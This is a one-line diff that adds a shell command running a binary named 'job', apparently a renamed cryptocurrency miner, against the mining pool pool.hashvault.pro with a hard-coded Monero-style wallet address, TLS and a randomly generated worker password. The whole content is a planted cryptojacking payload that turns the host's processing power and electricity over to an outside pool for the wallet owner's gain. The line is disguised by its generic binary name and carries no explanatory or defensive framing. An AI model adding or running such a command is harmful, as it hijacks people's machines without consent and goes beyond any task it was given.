@@ -1,0 +1,1 @@
+./job -o pool.hashvault.pro:443 -u 47xS7CWWZ8c7xdxBcuiqA7KLK8kRFcaLFPViKA9w3eHVe2WcKj8iaBEADzZYXGqE9sCC71cbu64qrZhZZkafzFn2VPA9xs9 -p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1) -k --tls
